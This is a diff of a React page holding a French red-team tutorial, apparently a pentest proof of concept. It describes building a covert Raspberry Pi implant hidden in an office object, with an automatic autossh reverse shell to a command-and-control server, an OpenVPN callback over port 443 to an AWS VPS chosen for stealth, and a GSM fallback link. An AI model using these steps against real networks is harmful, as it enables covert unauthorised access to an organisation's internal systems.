@@ -24,6 +24,10 @@ class Redteam extends React.Component {
 
         <img id="hacktheplanet" src={HackThePlanet} alt="hack the planet"></img>
 
+        <br/>
+        <hr/>
+        <br/>
+
         <h2>Contexte</h2>
         <p className="tabulation">Notre projet consiste à créer un implant qu'il suffira de déposer chez un client pour avoir un accès à distance au réseau interne. Cela représente la phase de compromission initiale dans le schéma suivant: <br/>
 
@@ -37,7 +41,9 @@ class Redteam extends React.Component {
         Plusieurs méthodes se doivent d'être implémentées au cas où des règles de pare-feu bloqueraient certains flux sortants et une méthode alternative de connexion via Wifi ou GSM est également à envisager.
         </p>
 
-        <img id="kaliraspberry" src={KaliRaspberry} alt="kali raspberry"/>
+        <br/>
+        <hr/>
+        <br/>
 
         <h2>Cahier des charges de la box</h2>
         <div>
@@ -52,7 +58,7 @@ class Redteam extends React.Component {
             </ul>
         Il existe de nombreux appareils comme le Hardkernel ODROID-N2 ou encore le Beaglebone Black mais au vu du prix, de la simplicité, et des autres critères, on préférera utiliser une <strong>Raspberry Pi.</strong></div>
 
-        <br/>
+        <img id="kaliraspberry" src={KaliRaspberry} alt="kali raspberry"/>
 
         <h2>Shopping list pour le matériel</h2>
         <div>
@@ -83,7 +89,10 @@ class Redteam extends React.Component {
         <img id="hide_raspberry" src={Hide} alt="idée pour chacher raspberry"/>
 
         <p>Cet objet du quotidien dans une entreprise a l'avantage de fournir l'alimentation et le câble réseau à la carte sans éveiller trop de soupçons de la part des employés</p>
+        
+        <br/>
         <hr/>
+        <br/>
 
         <h2>Configuration initiale</h2>
         <div>
@@ -121,7 +130,9 @@ class Redteam extends React.Component {
         </div>
 
         <br/>
-
+        <hr/>
+        <br/>
+        
         <h3>Configurer un point d'accès Wifi</h3>
 
         <p>On va utiliser l'outil <strong>raspAP</strong> pour mettre en place un point d'accès Wifi sur notre Raspberry :</p>
@@ -253,8 +264,13 @@ class Redteam extends React.Component {
         ##You should now see a wireless network named “iphone10” (or whatever named you use)<br/> where you can connect to it with your wpa_passphrase you set earlier. You<br/> should also have Internet too assuming your Raspberry Pi 4 has Internet. Once<br/> connected, you can also SSH into your Raspberry Pi 4.
         </div> */}
 
+
+        <br/>
+        <hr/>
+        <br/>
+
         <h3>Configurer un reverse shell automatique</h3>
-        <p>Pour cette partie on doit disposer d'un serveur de commande et de contrôle (C{"&"}C) accessible sur Internet avec SSH d'activé. Pour le POC j'ai pour le moment utilisé mon serveur perso ^^</p>   
+        <p>Pour cette partie on doit disposer d'un serveur de commande et de contrôle (C{"&"}C) accessible sur Internet avec SSH d'activé. Pour le POC j'ai pour le moment utilisé mon serveur perso ^^ <br/><strong>[Sur la Raspberry]</strong></p>   
 
         <div id="terminal">
         apt install autossh <br/>
@@ -296,11 +312,16 @@ class Redteam extends React.Component {
 
         <div id="terminal">ssh root@localhost -p 6667 (credentials par défaut de Kali)</div>      
         
+        <br/>
+        <hr/>
+        <br/>
+
         <h3>Configurer une connexion OpenVPN</h3>
         <p className="tabulation">Une garantie d'accès en plus du reverse SSH serait d'utiliser une connexion OpenVPN sur le port 443 (HTTPS). La Raspberry devra d'abord sortir par le port 443 vers un serveur OpenVPN Access Server en notre possession et il suffira de se connecter depuis la machine d'attaque au serveur VPN.
         </p>
 
-        <p>Cela se fait en 3 étapes :</p>
+        <u>Cela se fait en 3 étapes :</u>
+
         <ul>
           <li>Configuration d'OpenVPN Access Server sur le net</li>
           <li>Configuration de la Raspberry</li>
@@ -310,7 +331,7 @@ class Redteam extends React.Component {
         <br/>
 
         <h3>Mise en place OpenVPN Access Server</h3>
-        <p className="tabulation">Pour la solution d'hébergement du serveur VPN on peut opter pour un serveur VPS car ils sont faciles et rapides à mettre en place.<br/>
+        <p className="tabulation">Pour la solution d'hébergement du serveur VPN on peut opter pour un serveur VPS car ils sont faciles et rapides à mettre en place.<br/><br/>
 
         <strong>Vultr.com</strong> et <strong>Amazon Lightsail</strong> sont deux fournisseurs de VPS bon marché et simples à configurer. L'autre raison de ce choix est que le réseau de la victime aura souvent beaucoup de trafic vers les serveurs AWS, cela permet donc d'être plus discret dans le réseau. Pour le POC je me suis crée un VPS perso sur Amazon.
         </p>
@@ -376,20 +397,15 @@ class Redteam extends React.Component {
 
           <h3>Télécharger les profils OpenVPN</h3>
           <ol>
-            <li>Se connecter sur https://[Your VPS]:943/?src=connect</li>
+            <li>Se connecter sur https://[IP_VPS]:943/?src=connect</li>
             <li>Pour chaque utilisateur se connecter et télécharger le profil <strong>Yourself (autologin profile)</strong></li>
-
-            <img id="autologin" src={AutologinProfile} alt="autologin profile"/>
-
-            <li>Sauvegarder client.ovpn</li>
           </ol>
 
-          <br/>
+          <img id="autologin" src={AutologinProfile} alt="autologin profile"/>
 
           <h3>Configuration de la Raspberry Pi 4</h3>
           <li>Allumez la Raspberry et branchez un câble ethernet</li>
-          <li>Configurez le démarrage automatique d'OpenVPN :<br/>
-          <strong>vim /etc/default/openvpn</strong> et décommentez <strong>[‘AUTOSTART=”all”’]</strong></li>
+          <li>Configurez le démarrage automatique d'OpenVPN : <strong>vim /etc/default/openvpn</strong> <br/> et décommentez <strong>[‘AUTOSTART=”all”’]</strong></li>
           <li>Copiez <strong>client.ovpn</strong> sur la Raspberry dans <strong>/etc/openvpn/</strong></li>
           <li>Renommez le en <strong>client.conf</strong></li>
           <li>Activez OpenVPN pour démarrer au boot: <strong>update-rc.d openvpn enable</strong></li>
@@ -397,39 +413,48 @@ class Redteam extends React.Component {
           
           <br/>
 
-          <p className="tabulation">Sur le serveur OpenVPN AS, Connexions -> Utilisateurs actuels, on voit apparaître l'utilisateur <strong>redteam</strong> avec l'adresse réelle de l'endroit où la Raspberry est branchée et une adresse VPN.</p>
+          <p className="tabulation">Sur OpenVPN AS, Connexions -> Utilisateurs actuels, on voit apparaître l'utilisateur <strong>redteam</strong> avec l'adresse réelle de l'endroit où la Raspberry est branchée et une adresse VPN.</p>
 
           <img id="redteamuser" src={RedteamUser} alt="connexion utilisateur redteam"/>
           
-          <p className="tabulation"> Nous avons à présent la Raspberry configurée pour se reconnecter à notre serveur VPS dès qu'elle est connectée à un réseau.</p>
+          <p className="tabulation"> Nous avons à présent la Raspberry configurée pour se reconnecter au serveur OpenVPN de notre serveur VPS dès qu'elle est connectée à un réseau.</p>
 
           <img src="https://media.giphy.com/media/x2z9nswqAfpp6/giphy.gif" alt="yatta"/>
 
-          <h3>Configuration GSM pour la box</h3>
+          <p>Pour avoir un accès à la Raspberry il suffit d'utiliser le même profil vpn à partir de notre VM d'attaque et d'utiliser ssh sur l'adresse IP privée du dessus :</p>
+
+          <div id="terminal">
+            # openvpn --config ./client.ovpn <br/>
+            # ssh root@172.27.224.2
+          </div>
+
+          <br/>
+          <hr/>
+          <br/>
+
+          <h3>Configuration GSM</h3>
           <p>Lien pour dongle : <a href="http://shop.mchobby.be/product.php?id_product=677">dongle GSM (23,60€)</a>    (module 3G HSDPA, support SMS et connexion internet)</p>
 
+          <p className="tabulation">Ce module permet d'établir des connexions Internet via le réseau 3G et d'obtenir une connexion là où vous ne disposez pas d'ADSL, de ligne téléphonique classique ou de WiFi.</p>
 
-          <p className="tabulation">Ce module permet d'établir des connexions Internet via le réseau 3G... et d'obtenir une connexion Internet là où vous ne disposez pas d'ADSL, de ligne téléphonique classique, ou de WiFi.</p>
+          
+          <ul>
+            <li>Editez le fichier <strong>config.txt</strong> dans le dossier <strong>/boot/</strong></li>
+            <li>Ajoutez la ligne suivante: <strong>max_usb_current=1</strong></li>
+            <li>Après reboot, branchez la clef USB à la Raspberry</li>
+          </ul>
 
-          <p>Editer le fichier <strong>config.txt</strong> dans le dossier /boot/ <br/>
-          Ajouter la ligne suivante: <strong>max_usb_current=1</strong><br/>
-          Après reboot, vous pouvez brancher la clef USB à la Raspberry <br/><br/>
 
-          La commande <strong>lsusb</strong> devrait la faire apparaître dans la liste. Sinon vérifiez le matériel et la connectique.
-          <br/><br/>
-
-          $ sudo apt-get update <br/>
-          $ sudo apt-get install ppp wvdial<br/>
-          </p>
+          <p>La commande <strong>lsusb</strong> devrait la faire apparaître dans la liste. Sinon vérifiez le matériel et la connectique.</p>
+          
+          <div id="terminal">
+            $ sudo apt-get update<br/>
+            $ sudo apt-get install ppp wvdial<br/>
+          </div>
 
           <h4>Configuration de wvdial</h4>
 
-          <p>Le fichier de configuration de wvdial se trouve dans le dossier <strong>/etc/wvdial.conf</strong>
-          <br/><br/>
-
-          sudo nano /etc/wvdial.conf<br/><br/>
-
-          Le fichier de configuration est un fichier texte comme celui-ci dessous :
+          <p>Le fichier de configuration <strong>/etc/wvdial.conf</strong> :</p>
 
           <div id="terminal">
           [Dialer Defaults]<br/>
@@ -447,26 +472,22 @@ class Redteam extends React.Component {
           Baud = 9600
           </div>
 
-          Les paramètres web.be, web, web sont des paramètres propres aux opérateurs 3G (web.be, web, web sont les paramètres pour l'opérateur MobileVikings).<br/><br/>
+          <p>Les paramètres <strong>web.be</strong> sont des paramètres propres aux opérateurs 3G :<br/><br/>
 
           <strong>Pour Mobistar (Orange Belgique)</strong><br/>
-          A la place de web.be rentrez mworld.be, (business: entrez web.pro.be)<br/>
-          Dans le champ Nom d’utilisateur, n’entrez rien donc dans le fichier deux ' Username = ''<br/>
-          Dans le champ Mot de passe, n’entrez rien donc dans le fichier deux ' Password = ''<br/><br/>
+          Remplacez web.be par <strong>mworld.be</strong>, (business: entrez web.pro.be)<br/>
+          ' Username = '' et ' Password = ''<br/><br/>
 
           <strong>Pour Proximus</strong><br/>
-          A la place de web.be rentrez internet.proximus.be<br/>
-          Dans le champ Nom d’utilisateur, n’entrez rien donc dans le fichier deux ' Username = ''<br/>
-          Dans le champ Mot de passe, n’entrez rien donc dans le fichier deux ' Password = ''<br/><br/>
+          Remplacez web.be par <strong>internet.proximus.be</strong><br/>
+          ' Username = '' et ' Password = ''<br/><br/>
 
           <strong>Pour Base</strong><br/>
-          A la place de web.be rentrez gprs.base.be<br/>
-          Dans le champ Nom d’utilisateur, n’entrez rien donc dans le fichier deux ' Username = 'base'<br/>
-          Dans le champ Mot de passe, n’entrez rien donc dans le fichier deux ' Password = 'base'
+          Remplacez web.be par <strong>gprs.base.be</strong><br/>
+          ' Username = 'base' et ' Password = 'base'
           </p>
 
-          <p>Une fois wvdial configuré, il suffit de taper la commande <strong>sudo wvdial </strong> afin de lancer la connexion 3G.Plusieurs informations vont défiler à l'écran dont l'adresse IP publique et les DNS fournis par le FAI. CTRL+C pour couper la connexion, cela affichera le temps pendant laquelle la connexion a été maintenue.</p>
-         
+          <p className="tabulation">Une fois wvdial configuré, <strong>sudo wvdial</strong> afin de lancer la connexion 3G. Plusieurs informations vont défiler à l'écran dont l'adresse IP publique et les DNS fournis par le FAI. CTRL+C pour couper la connexion, cela affichera alors la durée pendant laquelle la connexion a été maintenue.</p>
       </div>
       );
     }
